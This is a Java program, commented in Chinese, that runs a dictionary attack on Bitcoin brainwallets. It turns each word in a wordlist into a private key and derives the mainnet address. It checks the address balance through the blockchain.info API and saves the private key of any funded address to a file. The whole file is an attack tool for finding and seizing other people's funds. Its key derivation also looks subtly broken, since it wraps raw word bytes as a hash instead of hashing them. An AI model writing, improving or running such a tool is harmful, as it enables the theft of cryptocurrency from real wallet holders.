package org.example;

import org.bitcoinj.core.*;
import org.bitcoinj.params.MainNetParams;
import org.bitcoinj.script.Script;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.ArrayList;

public class BitcoinDictionaryAttack {

    private static final String API_URL = "https://blockchain.info/q/addressbalance/";
    private static final String OUTPUT_FILE = "found_keys_1.txt";
    private static final String DICTIONARY_FILE = "wordlist.txt";  // 字典文件
    private static final NetworkParameters NETWORK_PARAMS = MainNetParams.get();

    public static void main(String[] args) {
        try {
            // 读取字典文件
            List<String> dictionary = loadDictionary(DICTIONARY_FILE);
            System.out.println("Dictionary loaded with " + dictionary.size() + " entries.");

            // 执行字典攻击
            for (String word : dictionary) {
                // 生成私钥
                ECKey key = generatePrivateKeyFromWord(word);

                // 根据私钥生成比特币地址
                Address address = Address.fromKey(NETWORK_PARAMS, key, Script.ScriptType.P2PKH);

                // 打印正在检查的地址
                System.out.println("Checking address: " + address);

                // 检查余额
                long balance = getBalance(address.toString());

                // 如果余额大于 0，则保存相关信息
                if (balance > 0) {
                    saveFoundKey(key, address.toString(), balance);
                    System.out.println("Found key! Private key: " + key.getPrivateKeyEncoded(NETWORK_PARAMS).toString() + ", Address: " + address + ", Balance: " + balance);
                }
            }

            System.out.println("Dictionary attack completed.");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // 从字典文件加载字典
    private static List<String> loadDictionary(String filename) throws IOException {
        List<String> dictionary = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(filename))) {
            String line;
            while ((line = reader.readLine()) != null) {
                dictionary.add(line.trim());
            }
        }
        return dictionary;
    }

    // 通过字典中的词生成私钥
    private static ECKey generatePrivateKeyFromWord(String word) {
        // 通过某种哈希算法（例如SHA-256）生成私钥
        byte[] seed = word.getBytes();  // 简单地将词转换为字节
        return ECKey.fromPrivate(Sha256Hash.wrap(seed).toBigInteger());  // 使用该字节生成私钥
    }

    // 获取比特币地址的余额
    private static long getBalance(String address) throws IOException {
        String urlString = API_URL + address;
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");
        connection.setConnectTimeout(10000);
        connection.setReadTimeout(10000);

        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                String response = reader.readLine();
                return Long.parseLong(response);  // 返回余额
            }
        } else {
            return 0;  // 如果请求失败，则认为该地址余额为0
        }
    }

    // 将找到的私钥、地址和余额保存到文件
    private static void saveFoundKey(ECKey key, String address, long balance) {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(OUTPUT_FILE, true))) {
            writer.write("Private Key: " + key.getPrivateKeyEncoded(NETWORK_PARAMS).toString() + ", Address: " + address + ", Balance: " + balance + "\n");
        } catch (IOException e) {
            System.err.println("Error writing to file: " + e.getMessage());
        }
    }
}
